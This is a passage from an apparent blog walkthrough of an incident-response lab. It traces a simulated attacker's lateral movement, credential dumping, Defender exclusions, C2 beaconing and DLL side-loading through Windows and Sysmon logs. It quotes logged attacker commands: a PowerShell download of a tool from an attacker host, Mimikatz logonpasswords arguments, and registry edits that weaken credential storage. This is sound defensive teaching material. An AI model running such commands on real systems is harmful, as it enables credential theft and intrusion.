<p>At around <code class="language-plaintext highlighter-rouge">2024-05-25 12:15</code>, activity characteristic of PsExec execution is observed. 8-alphanumeric character .exe files are written to <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>, and services are installed remotely. The attacker performs this twice: first at <code class="language-plaintext highlighter-rouge">2024-05-25 12:17:23</code> and later at <code class="language-plaintext highlighter-rouge">2024/05/25 12:41:54</code>. The executables involved are <code class="language-plaintext highlighter-rouge">qcBIRiAm.exe</code> and <code class="language-plaintext highlighter-rouge">LZbNNNSK.exe</code> respectively.</p>

<p><img src="/spellzedblog/assets/images/figure014.png" alt="figure014">
<strong>Figure 14</strong>: Several Windows Security events showing PSEXEC activity, granting the attacker to execute commands as SYSTEM.</p>

<p>Referring to Figure 14,</p>
<ul>
  <li>Windows Security 5145 event showing the file <code class="language-plaintext highlighter-rouge">LZbNNNSK.exe</code> being written on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> from <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong> 10.0.1.5</li>
  <li>Windows Security 5145 event showing the <code class="language-plaintext highlighter-rouge">svcctl</code> pipe is accessed for Inter Process Communication (IPC) at <code class="language-plaintext highlighter-rouge">2024-05-25 12:41:52</code>.</li>
  <li>Windows Security 4674 the access to a privileged object: Service Control Manager (SCM).</li>
  <li>Windows Security 4697 event showing the a new service, <code class="language-plaintext highlighter-rouge">LZbNNNSK.exe</code> was installed. The service is configured with a start type of <strong>3 (Manual Start)</strong>.</li>
  <li>Windows Security 5145 event showing the deletion of <code class="language-plaintext highlighter-rouge">LZbNNNSK.exe</code>.</li>
</ul>

<p>Shortly after the PSEXEC binaries are written to the destination share <code class="language-plaintext highlighter-rouge">C:\Code</code>, the <code class="language-plaintext highlighter-rouge">svcctl</code> named pipe is invoked to remotely interact with the Service Control Manager (SCM). The attacker‚Äôs objective is to manipulate services, enabling them to install a service to execute commands with <strong>SYSTEM</strong> privileges. PsExec can be executed via scripts like <code class="language-plaintext highlighter-rouge">psexec.py</code> from the <strong>Impacket</strong> suite of tools. The result is successful SYSTEM-level code execution on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>. To trace the full attack chain, pivot on the service executable name to analyze the associated process hierarchy.</p>

<p>The <code class="language-plaintext highlighter-rouge">stanley.eugene</code> account logs off at <code class="language-plaintext highlighter-rouge">2024-05-25 12:41:59</code>.</p>

<h2 id="discovering-techtonik">
<a class="anchor" href="#discovering-techtonik" aria-hidden="true"><span class="octicon octicon-link"></span></a>Discovering TechTonik</h2>

<blockquote>
  <p>üí≠ Ahead of the Curve</p>

  <p>Depending on your approach, you may find flags belonging to later sections before this one. In reality, investigations are not always linear either! Document as you go in the IR Tracker.</p>
</blockquote>

<p>We‚Äôre now going to focus on the internal discovery of the attacker, typically seen alongside or after establishing a foothold in the network. The bulk of which starts once the they first move laterally from <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong> to <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> at <code class="language-plaintext highlighter-rouge">2024/05/25 12:11:31</code>.</p>

<blockquote>
  <p>üí≠ We‚Äôre Going on a Bear Hunt</p>

  <p>A common approach I use while following the attacker‚Äôs trail if its gone cold or if I‚Äôm starting a new lead/hypothesis is to check out command execution.</p>
</blockquote>

<p>The TechTonik team has installed Sysmon so we have <strong>Windows Sysmon 1</strong>/<strong>Windows Security 4688</strong> events for process execution, and <strong>Powershell 4104</strong> events for PowerShell script execution. If enabled, PowerShell records script block logs upon successful script execution, decodes any base64 encoding, and writes the full script to the Windows event logs.</p>

<p>You can query for Sysmon event IDs 1 and 4 on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> and witness their internal reconnaissance activity with <code class="language-plaintext highlighter-rouge">stanley.eugene</code> using <code class="language-plaintext highlighter-rouge">powershell.exe</code> to call other binaries such as <code class="language-plaintext highlighter-rouge">cmd.exe</code>, <code class="language-plaintext highlighter-rouge">nslookup.exe</code>, <code class="language-plaintext highlighter-rouge">whoami.exe</code>. An <a href="https://krebsonsecurity.com/2023/08/tourists-give-themselves-away-by-looking-up-so-do-most-network-intruders/">interesting article by Brian Krebs calls this ‚Äú<em>looking up</em>‚Äù</a> , likening the behaviour to tourists; which in a way, they are on TechTonik‚Äôs network.</p>

<p>By querying for Powershell Event ID 4104 logs around this time, we see the following activity:</p>

<p><img src="/spellzedblog/assets/screenshots/figure015.png" alt="figure015"></p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">2024</span><span class="n">/05/25</span><span class="w"> </span><span class="nx">12:31:36</span><span class="w"> </span><span class="nx">iwr</span><span class="w"> </span><span class="nx">http://downloads.yxz.red:8080/msrdc.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">msrdc.exe</span><span class="w">
</span><span class="mi">2024</span><span class="n">/05/25</span><span class="w"> </span><span class="nx">12:34:11</span><span class="w"> </span><span class="o">.</span><span class="nx">\msrdc.exe</span><span class="w"> </span><span class="nt">-lolbas</span><span class="w"> </span><span class="nx">notcolor</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">debug.log</span><span class="w">
</span></code></pre></div></div>
<p><strong>Figure 15</strong>: Script block entries on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> showing the use of PowerShell to download winPEAS.</p>

<p>The term <code class="language-plaintext highlighter-rouge">lolbas</code> is a phrase meaning ‚ÄúLiving Off The Land Binaries And Scripts‚Äù, and a search of the CLI arguments indicates that this is <a href="https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md">winPEASexe</a>, a windows version of the script we found on device <strong><code class="language-plaintext highlighter-rouge">TTK-DEV-01</code></strong>.</p>

<p>The <a href="https://www.magnetforensics.com/blog/shimcache-vs-amcache-key-windows-forensic-artifacts/">AmCache.hve</a> is a Windows registry hive that records execution and the SHA-1 file hash of executables and DLLs. If we check the file ‚Äú<code class="language-plaintext highlighter-rouge">amcache_unassociatedfileentries.csv</code>‚Äù in the Triage image, we can find the SHA 1 of <code class="language-plaintext highlighter-rouge">msrdc.exe</code>. You can also calculate the hashsum yourself using <em><code class="language-plaintext highlighter-rouge">Get-Filehash</code></em> since the .exe still exists in the folder along with many other <em>goodies</em>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure016.png" alt="figure016">
<strong>Figure 16</strong>: The many goodies of the <code class="language-plaintext highlighter-rouge">systoolkit</code> folder</p>

<p>I highly recommend looking at the output of <code class="language-plaintext highlighter-rouge">msrdc.exe</code>, which we now know to be winPEAS, and see what the attacker has gained. The full path is: <code class="language-plaintext highlighter-rouge">c:\code\systoolkit\debug.log</code>.</p>

<h2 id="setting-up-the-network-for-attack">
<a class="anchor" href="#setting-up-the-network-for-attack" aria-hidden="true"><span class="octicon octicon-link"></span></a>Setting up the Network for Attack</h2>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Windows Defender configuration
  Local Settings
  Group Policy Settings

  Path Exclusions:
    \\TTK-FS-01\Code
    C:\Code
    \\10.0.2.5\Code
    \\127.0.0.1\Code

  PolicyManagerPathExclusions:
    \\TTK-FS-01\Code
    C:\Code
    \\10.0.2.5\Code
    \\127.0.0.1\Code
    ...
</code></pre></div></div>
<p><strong>Figure 17</strong>: A section of <code class="language-plaintext highlighter-rouge">c:\code\systoolkit\debug.log</code> which shows existing exclusions in the TechTonik environment</p>

<p>In the <code class="language-plaintext highlighter-rouge">debug.log</code> file above, we find that there are exclusions already in place by the TechTonik SOC team. For the attacker to add new ones, one way is to use <code class="language-plaintext highlighter-rouge">Get-MpPreference</code> and <code class="language-plaintext highlighter-rouge">Set-MpPreference</code> to identify and set Defender exclusions which are easily searchable in Powershell or logs tracking command execution. Three exclusions are added in this manner:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code></li>
  <li><code class="language-plaintext highlighter-rouge">C:\Windows\System32</code></li>
  <li><code class="language-plaintext highlighter-rouge">C:\Windows\Winstore</code></li>
</ul>

<blockquote>
  <p>üí≠ Where There‚Äôs Smoke, There‚Äôs Fire.</p>

  <p>The attacker adds 3 more exclusions onto <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>. It appears that these have to be added manually as they pivot across the network, which makes it a great way to track the attacker!</p>

  <p>See if you can spot the attacker trip up as they attempt to perform hands-on-keyboard execution before adding the exclusion on other devices.</p>
</blockquote>

<p>Something that catches our eye is the Kiwi icon just sitting there. <code class="language-plaintext highlighter-rouge">SearchIndexer.exe</code> doesn‚Äôt look quite right. Not only is this not the default location, but checking out the properties shows:</p>

<p><img src="/spellzedblog/assets/screenshots/figure018.png" alt="figure018"></p>

<p><strong>Figure 18</strong>: Oh snap!</p>

<h4 id="other-ways-to-determine-mimikatz-activity">
<a class="anchor" href="#other-ways-to-determine-mimikatz-activity" aria-hidden="true"><span class="octicon octicon-link"></span></a>Other ways to determine Mimikatz Activity:</h4>

<ul>
  <li>Checking Sysmon Process Creation logs, we see highly suspicious command line execution resembling mimikatz from SearchIndexer.exe:
    <div class="language-plaintext highlighter-rouge">
<div class="highlight"><pre class="highlight"><code>2024/05/25 12:46:18 SearchIndexer.exe  privilege::debug sekurlsa::logonpasswords
2024/05/25 12:48:23 .\SearchIndexer.exe  "privilege::debug"
</code></pre></div>    </div>
    <p><strong>Figure 19</strong>: <code class="language-plaintext highlighter-rouge">SearchIndexer.exe</code> run with the following commands observed by Sysmon Event ID 1</p>
  </li>
  <li>The new Sysmon Event ID 29 (<code class="language-plaintext highlighter-rouge">2024-05-25 12:40:22</code>) which triggers on EXE file creation will include file hashes.</li>
</ul>

<p><img src="/spellzedblog/assets/screenshots/figure020a.png" alt="figure020a">
<img src="/spellzedblog/assets/screenshots/figure020b.png" alt="figure020b"></p>

<p><strong>Figure 20</strong>: Sysmon event 29 and accompanying detection on VirusTotal for <code class="language-plaintext highlighter-rouge">SearchIndexer.exe</code></p>

<ul>
  <li>At <code class="language-plaintext highlighter-rouge">2024-05-25 12:48:24</code> a Sysmon ID 10 ‚ÄúProcess Accessed‚Äù event will show <code class="language-plaintext highlighter-rouge">SearchIndexer.exe</code> accessing <code class="language-plaintext highlighter-rouge">lsass.exe</code>. This should warrant further attention which will lead you to discover the culprit, Mimikatz.</li>
  <li>GrantedAccess code <code class="language-plaintext highlighter-rouge">0x1010</code> is the new permission Mimikatz v.20170327 uses for command <code class="language-plaintext highlighter-rouge">sekurlsa::logonpasswords</code>. Source: <a href="https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html">LSASS memory Read Access as seen on Threat Hunter Playbook.</a>
</li>
</ul>

<p><img src="/spellzedblog/assets/screenshots/figure021.png" alt="figure021"></p>

<p><strong>Figure 21</strong>: Sysmon event 10 for <code class="language-plaintext highlighter-rouge">SearchIndexer.exe</code> accessing <code class="language-plaintext highlighter-rouge">lsass.exe</code>.</p>

<h4 id="registry-modification">
<a class="anchor" href="#registry-modification" aria-hidden="true"><span class="octicon octicon-link"></span></a>Registry modification</h4>

<p><img src="/spellzedblog/assets/screenshots/figure022.png" alt="figure022"></p>
<pre><code class="language-cmd"> reg  add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d "0" /f
</code></pre>
<p><strong>Figure 22</strong>: Attacker modifying the registry with <code class="language-plaintext highlighter-rouge">reg.exe</code> to allow storage of LM password hashes on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>.</p>

<p>This interesting command being run at <code class="language-plaintext highlighter-rouge">25/5/2024 12:42:52</code> modifies the registry to permit the storage of <strong>LM (LAN Manager) hashes</strong> in the Security Account Manager (SAM) database. LM hashes are outdated and weak, making them highly vulnerable to brute-force or dictionary attacks if an attacker gains access to the SAM. While this change does not force the system to use weaker authentication protocols like LMv1 or NTLM, it does increase the risk of credential compromise if the password database is dumped.</p>

<ul>
  <li>LM hashes are weak and can be cracked easily due to their short length (14 characters) and lack of complexity.</li>
  <li>Stored LM hashes can be extracted from the SAM database and replayed in pass-the-hash (PtH) attacks.</li>
</ul>

<p>By pivoting on ‚ÄúCurrent Directory‚Äù in Figure 22, we can track the attacker in the TechTonik network. <em>Staging directories</em> are a technique observed by attackers to organise data to be exfiltrated or malware and code to be deployed. One can‚Äôt help but note the parallels between the software developers of Techtonik and our attacker. Regardless, this can be used against them as we can search for this directory later on to <em>find <strong>more</strong> evil</em>. Be wary as these exclusion directories are also home to plenty of legitimate activity.</p>

<blockquote>
  <p>üí≠ Low-hanging fruit</p>

  <ul>
    <li><code class="language-plaintext highlighter-rouge">C:\Code\systoolkit</code></li>
    <li>Exclusions applied to the following directories:
      <ul>
        <li><code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code></li>
        <li><code class="language-plaintext highlighter-rouge">C:\Windows\System32</code></li>
        <li><code class="language-plaintext highlighter-rouge">C:\Windows\WinStore</code></li>
      </ul>
    </li>
  </ul>

</blockquote>

<h3 id="pivoting-on-the-staging-directory-to-find-more-evil">
<a class="anchor" href="#pivoting-on-the-staging-directory-to-find-more-evil" aria-hidden="true"><span class="octicon octicon-link"></span></a>Pivoting on the Staging Directory to Find more Evil</h3>

<p>Let‚Äôs pivot on the staging directory <code class="language-plaintext highlighter-rouge">C:\Code\systoolkit</code> in the current directory field in Sysmon Process Creation logs.</p>

<p><img src="/spellzedblog/assets/screenshots/figure023.png" alt="figure023"></p>

<p><strong>Figure 23</strong>: Pivoting on the staging directory showing the attacker establish another avenue of Persistence</p>

<p>Referring to Figure 23,</p>
<ul>
  <li>pivoting on <code class="language-plaintext highlighter-rouge">*systoolkit*</code>
</li>
  <li>service installations can be found in either System 7045 or Security 4697 events.</li>
  <li>Note the difference service names, I‚Äôm not sure why there were two distinct names, but <code class="language-plaintext highlighter-rouge">debug_service</code> is the correct flag.</li>
</ul>

<p>Just minutes after the service installation, <code class="language-plaintext highlighter-rouge">cmd.exe</code> connects to a previously identified IP <code class="language-plaintext highlighter-rouge">44.222.89[.]156:443</code>. In fact, if you filter for Sysmon event ID 3 (Network Connection), the beacon pattern of the C2 callback can be observed. This version of <code class="language-plaintext highlighter-rouge">cmd.exe</code> might have been trojanized/modified as the hash didn‚Äôt match any known executable. It would appear that the attacker used this service to establish persistence for their own <code class="language-plaintext highlighter-rouge">cmd.exe</code>, which resides in a whitelisted directory <code class="language-plaintext highlighter-rouge">C:\Code</code>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure024.png" alt="figure024"></p>

<p><strong>Figure 24</strong>: Sysmon ID 3 records the connections to <code class="language-plaintext highlighter-rouge">44.222.89[.]156:443</code>. Note the regular pattern of connections between clusters of activity.</p>

<blockquote>
  <p>üí≠ C2 Beacon Configurations</p>

  <p>Beaconing configurations can be reused, so this could be interesting to take note of.</p>
</blockquote>

<p>Now lets <strong>exclude</strong> Sysmon ID 3 events to remove some of the noise so that the attacker‚Äôs next steps are clearer. Nothing much happens until <code class="language-plaintext highlighter-rouge">2024-05-27 21:36:59</code>, where <code class="language-plaintext highlighter-rouge">rr.exe</code> is written to disk, and is run by <code class="language-plaintext highlighter-rouge">cmd.exe</code> to connect to <code class="language-plaintext highlighter-rouge">downloads.yxz.red:56969</code>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure025.png" alt="figure025"></p>

<p><strong>Figure 25</strong>: The download and execution of <em>chisel</em></p>

<p>If we access the attacker‚Äôs staging directory <code class="language-plaintext highlighter-rouge">C:\Code\systoolkit</code>, we can take the hash of <code class="language-plaintext highlighter-rouge">rr.exe</code> with PowerShell if you haven‚Äôt yet already. The hash of this tool will identify it as <a href="https://github.com/jpillora/chisel">chisel</a>, a tool which can be used to tunnel traffic.</p>

<p><img src="/spellzedblog/assets/screenshots/figure026.png" alt="figure026"></p>

<p><strong>Figure 26</strong>: The attacker appears to be done with <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> for now.</p>

<p>Only minutes after at <code class="language-plaintext highlighter-rouge">2024-05-27 21:47:43</code>, the attacker pings device <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong> once before moving to <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>.</p>

<p><a href="https://imgflip.com/i/9l42es"><img src="https://i.imgflip.com/9l42es.jpg" title="made at imgflip.com"></a></p>

<h2 id="dll-hijacking">
<a class="anchor" href="#dll-hijacking" aria-hidden="true"><span class="octicon octicon-link"></span></a>DLL Hijacking</h2>

<p>A benefit of using the IR Tracker is recognising the movement of the attacker in the network and consequently being able to filter for events after a certain time. We can now filter for events after <code class="language-plaintext highlighter-rouge">2024-05-27 21:47:43</code> on <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>, significantly narrowing our time frame and allowing us to orienteer ourselves to the Attacker‚Äôs path and progress.</p>

<p>If I did not have any questions from the lab to guide my search, I would try searching for <code class="language-plaintext highlighter-rouge">systoolkit</code>, but we know that the trail for this directory goes cold on <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>.</p>

<blockquote>
  <p>üí≠ WWAD?</p>

  <p>At this point, It has been two days from the execution of Mimikatz on <code class="language-plaintext highlighter-rouge">2024/05/25 12:48:23</code>. Considering what an attacker might do in the downtime, I believe its likely that the attacker has cracked some of the hashes they obtained from <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> to traverse the network with valid user accounts.</p>
</blockquote>

<p>By searching for our IP, <code class="language-plaintext highlighter-rouge">44.222.89[.]156</code>, we can find a DNS request and a subsequent connection to the C2 made by user <code class="language-plaintext highlighter-rouge">techtonik\lindon.renae</code> from an application <code class="language-plaintext highlighter-rouge">SumatraPDF.exe</code>. The IP is a known bad by this point, so we‚Äôve found our smoking gun on <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure027.png" alt="figure027"></p>

<p><strong>Figure 27</strong>: Sysmon legs showing network activity from <code class="language-plaintext highlighter-rouge">SumatraPDF.exe</code></p>

<p>Referring to Figure 27,</p>
<ul>
  <li>
<code class="language-plaintext highlighter-rouge">SumatraPDF.exe</code> makes a DNS request (Sysmon Event ID 22) for <code class="language-plaintext highlighter-rouge">docs.xyz.red</code> which returns the attacker‚Äôs IP.</li>
  <li>Subsequent connections made by both <code class="language-plaintext highlighter-rouge">SumatraPDF.exe</code> and <code class="language-plaintext highlighter-rouge">cmd.exe</code>. Note the anomalous location for <code class="language-plaintext highlighter-rouge">cmd.exe</code> and recall that the attacker whitelisted <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code> earlier on <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>.</li>
</ul>

<p>Let‚Äôs examine the strange PDF application more closely.</p>

<h3 id="sumatrapdfexe">
<a class="anchor" href="#sumatrapdfexe" aria-hidden="true"><span class="octicon octicon-link"></span></a>SumatraPDF.exe</h3>

<p>We set our filter for <code class="language-plaintext highlighter-rouge">*Sumatrapdf.exe*</code> and a timeframe after <code class="language-plaintext highlighter-rouge">2024-05-27 21:47:43</code> on <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>. Sysmon process creation events at <code class="language-plaintext highlighter-rouge">2024-05-27 22:09:15</code> show that the copy of <code class="language-plaintext highlighter-rouge">Sumatrapdf.exe</code> run seems to be valid as verified via <a href="https://www.virustotal.com/gui/file/2be4a27b83830ea07c6671c3557673d509544e5f70fc6b2dc8cc4388b302c1f2">hash on VirusTotal</a>.</p>

<p>How then did the attacker get a call back to their IP?</p>

<p><img src="/spellzedblog/assets/screenshots/figure028.png" alt="figure028"></p>

<p><strong>Figure 28</strong>: Sysmon recording execution of SumatraPDF, including the hashes for our checks.</p>

<p>As seen in Figure 28, <code class="language-plaintext highlighter-rouge">SumartaPDF.exe</code> is genuine but has been observed connecting to the attacker‚Äôs IP. This version of SumatraPDF is <strong>3.5.2</strong>. A search reveals that this version is indeed vulnerable to a DLL hijacking attack <a href="https://vulmon.com/exploitdetails?qidtp=exploitdb&amp;qid=260431c4bf718f16940d65c7a74690e935f1132e5750593158b7961d93c3e061">as reported here on Vulmon</a>. The Vulmon report lists of 5 potential .dll files which can be replaced, including <code class="language-plaintext highlighter-rouge">DWrite.dll</code>. When <code class="language-plaintext highlighter-rouge">Sumatrapdf.exe</code> is run, it loads 3 .dll files displayed in Figure - Only the hash of <code class="language-plaintext highlighter-rouge">DWrite.dll</code> is unknown. It is likely that the attacker has exploited this vulnerability in a DLL Side Loading attack.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">DLL Name</th>
      <th style="text-align: left">Hash Result</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">C:\Windows\System32\urlmon.dll</code></td>
      <td style="text-align: left">Matched on <a href="https://www.virustotal.com/gui/file/478952dcdb0e802ec206a7ac2bc381ef7b8c163c07762411e1246c65643f092b">Virustotal</a>
</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">C:\Users\lindon.renae\AppData\Local\SumatraPDF\libmupdf.dll</code></td>
      <td style="text-align: left">Matched on <a href="https://www.virustotal.com/gui/file/178784bd40ffc21a8e7112f68949880cfa53ad3a6de3b5ab6888bc8f569c6a4a">VirusTotal</a>
</td>
    </tr>
    <tr>
      <td style="text-align: left"><code class="language-plaintext highlighter-rouge">C:\Users\lindon.renae\AppData\Local\SumatraPDF\DWrite.dll</code></td>
      <td style="text-align: left">Not Matched on <a href="https://www.virustotal.com/gui/search/07BC401B93AAE89787AAE1AB1EBF7650">VirusTotal</a>
</td>
    </tr>
  </tbody>
</table>

<p><img src="/spellzedblog/assets/screenshots/figure029.png" alt="figure029"></p>

<p><strong>Figure 29</strong>: .dll files loaded and recorded by Sysmon event ID 7 (ImageLoaded) when <code class="language-plaintext highlighter-rouge">SumatraPDF.exe</code> is run.</p>

<p>There was no evidence that the attacker downloaded this program. It is possible that this program was already in use in TechTonik by <code class="language-plaintext highlighter-rouge">lindon.renae</code>. This is a possible case of  <em>Shadow IT</em> in the TechTonik environment, or use of unauthorised programs against company IT policy.</p>

<blockquote>
  <p>üí≠ The Proof is in the Pudding</p>

  <p>On this occasion, we were able to find a vulnerable version already reported on Vulmon. If there is no such report, apart from checking the hashes made available by Sysmon ID 7 and 10, we may have to perform malware analysis on the files of interest.</p>
</blockquote>

<p>Through this vulnerable version of <code class="language-plaintext highlighter-rouge">Sumatrapdf.exe</code>, the attacker has another avenue of Persistence.</p>

<h3 id="how-does-the-attacker-pivot-to-the-sql-server">
<a class="anchor" href="#how-does-the-attacker-pivot-to-the-sql-server" aria-hidden="true"><span class="octicon octicon-link"></span></a>How does the attacker pivot to the SQL server?</h3>

<p>There are many questions not posed by the lab, fair enough because there‚Äôs lots to investigate! For those of us who are interested as to how the attacker pivoted into <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong> read on, otherwise skip ahead to ‚ÄúSigned Drivers and EDRSandblast‚Äù.</p>

<p>As we‚Äôve been diligent in our tracking we can narrow the timeframe from <code class="language-plaintext highlighter-rouge">2024-05-27 21:47:43</code> to <code class="language-plaintext highlighter-rouge">2024-05-27 22:09:15</code>. Considering the earlier installation of the <em>chisel</em> tool, it‚Äôs possible that the attacker might pivot from <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong>.</p>

<p>Indeed we find evidence of <code class="language-plaintext highlighter-rouge">rr.exe</code> (chisel) making connections over port 3389 from <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> to <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure030a.png" alt="figure030a">
<img src="/spellzedblog/assets/screenshots/figure030b.png" alt="figure030b"></p>

<p><strong>Figure 30</strong>: Sysmon ID 3 events showing connections on port 3389 (RDP) from <strong><code class="language-plaintext highlighter-rouge">TTK-FS-01</code></strong> to <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>.</p>

<p>The destination port (3389) above should give us a hint that the attacker is attempting to move laterally over Remote Desktop Protocol (RDP). Within 10 minutes of the first RDP connection at <code class="language-plaintext highlighter-rouge">2024/05/27 21:59:37</code>, we find a 4624 logon type 10 (RDP) event for <code class="language-plaintext highlighter-rouge">lindon.renae</code>.</p>

<p><img src="/spellzedblog/assets/screenshots/figure031.png" alt="figure031"></p>

<p><strong>Figure 31</strong>: Windows Security 4624 event for <code class="language-plaintext highlighter-rouge">techtonik\lindon.renae</code> on <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong></p>

<ul>
  <li>Security 4624 events tell us the type of logon - 10 refers to RDP</li>
  <li>The account name in use</li>
  <li>Note the source workstation name. The attacker is masquerading as <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>.</li>
</ul>

<p>We can also see unsuccessful 4776 events before successfully authenticating with <code class="language-plaintext highlighter-rouge">lindon.renae</code>. This is likely due to the incorrect username <code class="language-plaintext highlighter-rouge">techtoniklindon.renae</code>, perhaps the attacker did not escape the backslash <code class="language-plaintext highlighter-rouge">\</code> between the domain and the username.</p>

<p><img src="/spellzedblog/assets/screenshots/figure032a.png" alt="figure032a">
<img src="/spellzedblog/assets/screenshots/figure032b.png" alt="figure032b"></p>

<p><strong>Figure 32</strong>: Several failed 4776 events for ‚Äú<code class="language-plaintext highlighter-rouge">techtoniklindon.renae</code>‚Äù.</p>

<ul>
  <li>The Status code returned <code class="language-plaintext highlighter-rouge">0xC0000064</code> on observed 4776 events indicates: ‚Äú<code class="language-plaintext highlighter-rouge">The username you typed does not exist. Bad username.</code>‚Äù</li>
</ul>

<h3 id="why-does-the-actor-use-the-credential-lindonrenae-a-sid-analysis">
<a class="anchor" href="#why-does-the-actor-use-the-credential-lindonrenae-a-sid-analysis" aria-hidden="true"><span class="octicon octicon-link"></span></a>Why does the actor use the credential <code class="language-plaintext highlighter-rouge">lindon.renae</code>? A SID analysis:</h3>

<p>In this lab, we see the attacker use <code class="language-plaintext highlighter-rouge">ttkadmin</code> only on <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>. Comparing the group membership SIDs of both users, it appears that <code class="language-plaintext highlighter-rouge">ttkadmin</code> has the highest privilege of domain admin, but lacks a key group membership which made our attacker use <code class="language-plaintext highlighter-rouge">lindon.renae</code> to access <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong>.</p>

<table>
  <thead>
    <tr>
      <th>SID</th>
      <th>Identifies users that are‚Ä¶</th>
      <th>ttkadmin</th>
      <th>lindon.renae</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">%{S-1-5-21-1732287905-1419500290-3997047612-512}</code></td>
      <td>Domain Admins: supreme overlord.</td>
      <td>‚úÖ</td>
      <td>¬†</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">%{S-1-5-21-1732287905-1419500290-3997047612-519}</code></td>
      <td>Enterprise Admins: users authorized to make changes to the AD infrastructure e.g., adding servers</td>
      <td>‚úÖ</td>
      <td>¬†</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">%{S-1-5-21-1732287905-1419500290-3997047612-520}</code></td>
      <td>Group Policy Creator Owners: can make new GPO objects in AD</td>
      <td>‚úÖ</td>
      <td>¬†</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">%{S-1-5-32-544}</code></td>
      <td>Local administrators</td>
      <td>‚úÖ</td>
      <td>‚úÖ</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">%{S-1-5-32-555}</code></td>
      <td>RDP permitted users</td>
      <td>¬†</td>
      <td>‚úÖ</td>
    </tr>
  </tbody>
</table>

<p>For more exciting stuff that will have you on the edge of your <em>SID</em>, you can check out <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">this article on SIDs on Microsoft Learn</a>.</p>

<p>We can see that <code class="language-plaintext highlighter-rouge">lindon.renae</code> was not the user of highest privilege but was used to pivot to <strong><code class="language-plaintext highlighter-rouge">TTK-SQL-01</code></strong> likely because it was able to access other devices over RDP. They also had the <code class="language-plaintext highlighter-rouge">SeEnableDelegationPrivilege</code> which enabled them to act on behalf of other users.</p>

<h3 id="why-would-the-attacker-enable-restricted-admin-mode">
<a class="anchor" href="#why-would-the-attacker-enable-restricted-admin-mode" aria-hidden="true"><span class="octicon octicon-link"></span></a>Why Would The Attacker <strong>enable</strong> Restricted Admin Mode?</h3>

<p><a href="https://imgflip.com/i/9kb3gs"><img src="https://i.imgflip.com/9kb3gs.jpg" title="made at imgflip.com"></a></p>

<p>There was also considerable evidence of premeditation on the part of the attacker, if you recall at <code class="language-plaintext highlighter-rouge">25/5/2024 12:42:52</code>, the registry was modified with the following command to permit the storage of weaker LM hashes in the SAM database:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d "0" /f
</code></pre></div></div>

<p>Minutes after at <code class="language-plaintext highlighter-rouge">2024/05/25 12:43:01</code>, they also modified the <em>DisableRestrictedAdmin</em> key which enables Restricted Admin mode:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d "0" /f
</code></pre></div></div>

